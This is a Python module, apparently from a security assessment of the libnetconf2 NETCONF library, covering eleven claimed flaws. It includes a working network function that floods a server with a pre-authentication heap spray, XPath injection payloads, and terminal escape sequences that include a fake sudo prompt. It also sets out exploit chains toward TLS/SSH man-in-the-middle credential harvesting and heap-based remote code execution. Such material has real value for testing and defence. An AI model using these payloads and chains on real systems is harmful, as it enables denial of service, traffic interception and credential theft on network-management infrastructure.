#!/usr/bin/env python3
"""
libnetconf2 security RE module.

Covers:
  F1  session.c:1533  nc_parse_cpblts — unbounded <capability> heap allocation
                      pre-auth spray primitive; calloc(i+1, sizeof(char*)) with
                      no cap on the libyang-parsed capability count.
  F2  session.c:1051  nc_session_free  — TOCTOU double-free on concurrent teardown.
                      status read at entry, NC_STATUS_CLOSING written at +70 lines;
                      no atomic/lock covers the window.
  F3  messages_client.c:102 — filter string accepted with single-byte validity
                      check; XPath injection / DoS via crafted filter.
  F7  session_openssl.c:474 — TLS intermediate chain depth>0 always returns 1
                      (success) to OpenSSL verify callback. Full MitM on
                      NETCONF-over-TLS without client certificate rejection.
  F8  session_client_ssh.c:477 — NC_SSH_KNOWNHOSTS_ACCEPT accepts changed
                      hostkeys with warning only. Second bypass at line 463 (SKIP).
  F9  session_openssl.c:1058 — (strlen/4)*3 base64 allocation underestimates
                      by up to 2 bytes on inputs whose length % 4 != 0.
  F10 session_client_ssh.c:1453 — memset before free; optimized away; passwords
                      survive in freed heap (CWE-14).
  F11 session_client_ssh.c:1303 — server banner printed verbatim; no escape
                      stripping; terminal injection.

Chain:
  MitM chain:   F7 / F8  →  intercept NETCONF session  →  credential harvest
  RCE chain:    F1 (heap spray, pre-auth) + F2 (double-free race) → heap RCE

Source: CESNET/libnetconf2 (github.com/CESNET/libnetconf2).
Authorized assessment only.
"""

import os
import socket
import struct
import threading
import time
from typing import Optional


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

def _finding(fid: str, severity: str, title: str, detail: str,
             file: str, line: int) -> dict:
    return {
        "id": fid,
        "severity": severity,
        "title": title,
        "detail": detail,
        "file": file,
        "line": line,
    }


# ---------------------------------------------------------------------------
# F1 — pre-auth heap spray via <capability> flood
# ---------------------------------------------------------------------------

def build_hello_spray(n_caps: int, cap_len: int = 64,
                      base_cap: str = "urn:ietf:params:netconf:base:1.0") -> bytes:
    """
    Build a NETCONF <hello> with n_caps <capability> children of cap_len bytes
    each. Triggers nc_parse_cpblts → calloc(n_caps+1, sizeof(char*)) on the
    server without authentication.

    Heap impact:
      pointer array : (n_caps + 1) * 8  bytes (64-bit)
      string copies : n_caps * cap_len   bytes
      total         : n_caps * (cap_len + 8) bytes

    At n_caps=100000, cap_len=64: ~7.2 MB allocated pre-auth.
    """
    filler = "A" * cap_len
    caps = "".join(f"<capability>{filler}-{i}</capability>" for i in range(n_caps))
    msg = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<hello xmlns="urn:ietf:params:xml:ns:netconf:base:1.0">'
        "<capabilities>"
        f"<capability>{base_cap}</capability>"
        f"{caps}"
        "</capabilities>"
        "</hello>"
        "]]>]]>"
    )
    return msg.encode()


def f1_heap_spray(host: str, port: int, n_caps: int = 50000, cap_len: int = 64,
                  timeout: float = 10.0) -> dict:
    """
    Send a <hello> flood to trigger pre-auth heap allocation.
    Returns allocation size and whether the server accepted the hello.

    Spray size: n_caps × (cap_len + 8 pointer) bytes.
    At default params: ~3.6 MB pre-auth heap write.
    """
    payload = build_hello_spray(n_caps, cap_len)
    spray_bytes = n_caps * (cap_len + 8)

    result = {
        "finding": "F1",
        "host": host,
        "port": port,
        "n_caps": n_caps,
        "cap_len": cap_len,
        "spray_bytes": spray_bytes,
        "response": None,
        "server_closed": False,
        "error": None,
    }

    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        # Read server hello first
        buf = b""
        while b"]]>]]>" not in buf:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
        # Send spray payload
        s.sendall(payload)
        # Read response (server may close or send rpc-error)
        try:
            resp = s.recv(4096)
            result["response"] = resp.decode(errors="replace")
            result["server_closed"] = len(resp) == 0
        except socket.timeout:
            result["response"] = "timeout — server may be processing"
        s.close()
    except Exception as e:
        result["error"] = str(e)

    return result


def analyze_f1(result: dict) -> list:
    findings = []
    if result.get("error") and "refused" not in result["error"].lower():
        return findings
    spray_mb = result["spray_bytes"] / (1024 * 1024)
    findings.append(_finding(
        "F1", "CRITICAL",
        "Pre-auth unbounded heap spray (nc_parse_cpblts)",
        f"Sent {result['n_caps']} <capability> elements ({spray_mb:.1f} MB spray) "
        f"to {result['host']}:{result['port']} without authentication. "
        f"server_closed={result.get('server_closed')}. "
        f"Source: session.c:1533 calloc(i+1, sizeof(char*)), no cap on i. "
        f"Chain link: pre-auth spray primitive for F2 double-free.",
        "session.c", 1533,
    ))
    return findings


# ---------------------------------------------------------------------------
# F2 — TOCTOU double-free race on concurrent session teardown
# ---------------------------------------------------------------------------

class _SessionTeardownRacer:
    """
    Models the concurrent nc_session_free race.

    Race window:
      Thread A: status = session->status       (read: NC_STATUS_RUNNING)
      Thread B: status = session->status       (read: NC_STATUS_RUNNING)
      Thread A: if (status == CLOSING) return  (not taken)
      Thread B: if (status == CLOSING) return  (not taken)
      Thread A: ... do teardown ...
      Thread A: session->status = NC_STATUS_CLOSING
      Thread B: ... do teardown again (double-free of session members)

    session->status is NOT read with ATOMIC_LOAD — it's a plain load from a
    shared struct with no lock covering the check-to-write window.
    """
    def __init__(self):
        self.status = 0  # 0 = running, 1 = closing
        self.freed_count = 0
        self._lock = threading.Lock()

    def _session_free_thread(self, thread_id: int, results: list):
        # Replicate the libnetconf2 TOCTOU: status read then checked
        status = self.status  # non-atomic read
        time.sleep(0.00001)   # simulate work between read and write
        if status == 1:       # NC_STATUS_CLOSING
            return
        # Window: both threads pass here concurrently
        with self._lock:
            self.freed_count += 1
        time.sleep(0.00005)   # simulate teardown work
        self.status = 1       # NC_STATUS_CLOSING — written too late
        results.append(thread_id)

    def run_race(self, iterations: int = 10000) -> dict:
        """Run the race N times. Returns win count (double-free trigger count)."""
        wins = 0
        for _ in range(iterations):
            self.status = 0
            self.freed_count = 0
            results = []
            t1 = threading.Thread(target=self._session_free_thread, args=(1, results))
            t2 = threading.Thread(target=self._session_free_thread, args=(2, results))
            t1.start(); t2.start()
            t1.join(); t2.join()
            if len(results) == 2:
                wins += 1
        return {"iterations": iterations, "race_wins": wins,
                "win_rate": wins / iterations}


def f2_race_model(iterations: int = 10000) -> dict:
    """
    Model the F2 TOCTOU race locally (no network). Shows win rate for the
    double-free window in nc_session_free.

    A real exploit on the server requires:
    1. Two threads to call nc_session_free concurrently.
    2. On netopeer2/sysrepo: a disconnect + timeout/watchdog on the same
       session at the exact moment triggers this.
    """
    racer = _SessionTeardownRacer()
    result = racer.run_race(iterations)
    return result


def analyze_f2(race_result: dict) -> list:
    findings = []
    if race_result["race_wins"] > 0:
        findings.append(_finding(
            "F2", "HIGH",
            "TOCTOU double-free race in nc_session_free",
            f"Race win rate: {race_result['win_rate']:.4%} over "
            f"{race_result['iterations']} iterations. "
            f"source: session.c:1051 — status read non-atomically, "
            f"NC_STATUS_CLOSING written ~70 lines later with no lock covering "
            f"the window. Concurrent free on same session = double-free of "
            f"session members. Chain link: heap layout controlled by F1 spray "
            f"→ controlled double-free → RCE.",
            "session.c", 1051,
        ))
    return findings


# ---------------------------------------------------------------------------
# F3 — XPath filter injection via single-byte check
# ---------------------------------------------------------------------------

def build_get_with_filter(filter_expr: str, message_id: str = "1") -> bytes:
    """
    Build a <get> RPC with a subtree or XPath filter. The filter_expr is
    passed without validation beyond a single-byte check in messages_client.c:102.
    XPath injection payloads target the server-side filter evaluator.
    """
    msg = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<rpc xmlns="urn:ietf:params:xml:ns:netconf:base:1.0" message-id="{message_id}">'
        "<get>"
        f'<filter type="xpath" select="{filter_expr}"/>'
        "</get>"
        "</rpc>"
        "]]>]]>"
    )
    return msg.encode()


# XPath injection test vectors
FILTER_PAYLOADS = [
    ("xpath_tautology",  "/* | /*[1=1]",           "tautology — returns all nodes"),
    ("xpath_all_config", "/netconf:rpc-reply//*",  "all reply nodes"),
    ("xpath_string_fn",  "/*[contains(., 'password')]",  "grep for passwords"),
    ("xpath_count_dos",  "count(//node())",         "node count — DoS on large trees"),
    ("xpath_entity",     "//*[. = '&amp;']",        "entity injection in XPath"),
    ("xpath_quote_break","/' or '1'='1",            "string delimiter injection"),
    ("xpath_concat",     "/*[name()=concat('','')]", "concat function"),
    ("xpath_long",       "//" + "a" * 4096,         "4096-char XPath — length boundary"),
]


# ---------------------------------------------------------------------------
# F7 — TLS chain verification bypass
# ---------------------------------------------------------------------------

def analyze_f7_static() -> list:
    """
    Static analysis finding: session_openssl.c:474.

    int verify_callback(int preverify_ok, X509_STORE_CTX *x509_ctx) {
        int depth = X509_STORE_CTX_get_error_depth(x509_ctx);
        if (depth > 0) {
            return 1;   // intermediate certs: always accept regardless of preverify_ok
        }
        ...
    }

    Effect: only the leaf certificate (depth==0) is checked. Any intermediate
    CA in the chain is accepted without validation. A self-signed intermediate
    or a revoked intermediate passes verification.

    Attack: Attacker generates a self-signed intermediate CA cert, issues a
    leaf from it. Client (libnetconf2) accepts it if the leaf passes basic
    checks (CN match). Full MitM on NETCONF-over-TLS.
    """
    return [_finding(
        "F7", "CRITICAL",
        "TLS intermediate chain always accepted (verify_callback depth>0 → 1)",
        "session_openssl.c:474: depth>0 returns 1 unconditionally. "
        "Self-signed intermediate CA → valid leaf → full TLS MitM. "
        "No certificate revocation check at any depth. "
        "Chain: attacker intercepts NETCONF session, reads/injects management plane traffic.",
        "session_openssl.c", 474,
    )]


# ---------------------------------------------------------------------------
# F8 — SSH known-hosts ACCEPT/SKIP bypass
# ---------------------------------------------------------------------------

def analyze_f8_static() -> list:
    """
    Static analysis finding: session_client_ssh.c:477 + 463.

    At line 477: NC_SSH_KNOWNHOSTS_ACCEPT — accepts any changed hostkey with
    only a warning log. Credentials are sent to the server regardless.

    At line 463: NC_SSH_KNOWNHOSTS_SKIP — skips known-hosts check entirely.

    Both are documented options; the security issue is that the default
    callback in many libnetconf2 integrations uses ACCEPT or SKIP for
    "convenience" (e.g., test setups). Downstream: Junos mgd clients that
    use libnetconf2 for northbound calls.
    """
    return [
        _finding(
            "F8a", "HIGH",
            "SSH ACCEPT mode sends credentials to attacker server",
            "session_client_ssh.c:477: NC_SSH_KNOWNHOSTS_ACCEPT logs warning "
            "but proceeds with auth. Changed hostkey = MITM = credentials exfiltrated. "
            "Chain link for F7/F8 → credential harvest path.",
            "session_client_ssh.c", 477,
        ),
        _finding(
            "F8b", "HIGH",
            "SSH SKIP mode bypasses known-hosts entirely",
            "session_client_ssh.c:463: NC_SSH_KNOWNHOSTS_SKIP skips the "
            "hostkey check. No warning. Any server accepted.",
            "session_client_ssh.c", 463,
        ),
    ]


# ---------------------------------------------------------------------------
# F9 — base64 allocation underestimate
# ---------------------------------------------------------------------------

def f9_check_allocation(input_len: int) -> dict:
    """
    Replicate the F9 allocation: (strlen/4)*3 underestimates by 1-2 bytes
    when input length % 4 != 0 (inputs not padded to 4-byte boundary).

    session_openssl.c:1058:
        size_t len = (strlen(b64) / 4) * 3;

    Correct:  ceil(len/4) * 3 - padding
    Actual:   floor(len/4) * 3  → short by 1-2 bytes if len%4 != 0
    """
    floor_alloc = (input_len // 4) * 3
    # Base64 of input_len bytes decodes to at most ceil(input_len/4)*3 bytes
    import math
    ceil_alloc = math.ceil(input_len / 4) * 3
    delta = ceil_alloc - floor_alloc
    return {
        "input_len": input_len,
        "allocated": floor_alloc,
        "needed": ceil_alloc,
        "underestimate_bytes": delta,
        "oob_write_possible": delta > 0,
    }


def analyze_f9() -> list:
    # Find worst cases
    worst = [(n, f9_check_allocation(n)) for n in range(1, 200)
             if f9_check_allocation(n)["underestimate_bytes"] > 0]
    sample = worst[:3]
    return [_finding(
        "F9", "HIGH",
        "Base64 allocation underestimates by 1-2 bytes (heap OOB write)",
        f"session_openssl.c:1058: (strlen/4)*3 allocates too small for "
        f"non-padded inputs. Example: len={sample[0][0]} → alloc={sample[0][1]['allocated']} "
        f"but needs {sample[0][1]['needed']} → {sample[0][1]['underestimate_bytes']} byte OOB. "
        f"Writes up to 2 bytes past the heap allocation boundary.",
        "session_openssl.c", 1058,
    )]


# ---------------------------------------------------------------------------
# F10 — memset-before-free elided (password survives in heap)
# ---------------------------------------------------------------------------

def analyze_f10_static() -> list:
    return [_finding(
        "F10", "MEDIUM",
        "Password memset before free elided by optimizer (CWE-14)",
        "session_client_ssh.c:1453: memset(password, 0, len) immediately "
        "before free(password). Modern compilers (GCC -O2+, clang) optimize "
        "out dead stores to soon-freed memory. Password bytes survive in the "
        "freed chunk until overwritten. Heap disclosure after F1 spray may "
        "recover credentials. Fix: explicit_bzero / OPENSSL_cleanse.",
        "session_client_ssh.c", 1453,
    )]


# ---------------------------------------------------------------------------
# F11 — terminal injection via unescaped server banner
# ---------------------------------------------------------------------------

TERMINAL_INJECTION_SEQS = [
    (b"\x1b[2J",          "clear screen"),
    (b"\x1b[H",           "cursor home"),
    (b"\x1b]0;PWNED\x07", "terminal title set"),
    (b"\x1b[?1049h",      "alternate screen buffer"),
    (b"\r\n" + b"[sudo] password for root: ", "fake sudo prompt"),
    (b"\x1b[6n",          "cursor position request (info leak)"),
]


def build_banner_injection(payload: bytes, max_len: int = 255) -> bytes:
    """
    Craft a server banner containing terminal escape sequences.
    session_client_ssh.c:1303 prints the banner verbatim via WRN().
    """
    if len(payload) > max_len:
        payload = payload[:max_len]
    return b"SSH-2.0-OpenSSH_8.9p1 Ubuntu " + payload


def analyze_f11_static() -> list:
    return [_finding(
        "F11", "LOW",
        "Server banner printed verbatim — terminal injection",
        "session_client_ssh.c:1303: WRN() prints server banner without "
        "escape stripping. Attacker-controlled SSH server sends malicious "
        "banner → terminal escape injection on the client's console. "
        "Impact: fake sudo prompt, screen clear, title hijack, cursor position "
        "info leak. Pre-auth (banner exchange before any credential check).",
        "session_client_ssh.c", 1303,
    )]


# ---------------------------------------------------------------------------
# Full audit runner
# ---------------------------------------------------------------------------

def run_full_audit(host: Optional[str] = None, port: int = 830,
                   run_network: bool = False,
                   f1_n_caps: int = 10000,
                   f2_iterations: int = 10000) -> dict:
    """
    Run all libnetconf2 audit checks. Static analysis runs always.
    Network probes (F1) only run when run_network=True and host is set.
    """
    all_findings = []

    # Static findings
    all_findings.extend(analyze_f7_static())
    all_findings.extend(analyze_f8_static())
    all_findings.extend(analyze_f9())
    all_findings.extend(analyze_f10_static())
    all_findings.extend(analyze_f11_static())

    # Race model (local, no network)
    race = f2_race_model(f2_iterations)
    all_findings.extend(analyze_f2(race))

    # Network probes
    if run_network and host:
        spray_result = f1_heap_spray(host, port, n_caps=f1_n_caps)
        all_findings.extend(analyze_f1(spray_result))

    return {
        "target": f"{host}:{port}" if host else "static-only",
        "findings": all_findings,
        "f2_race": race,
        "total": len(all_findings),
    }
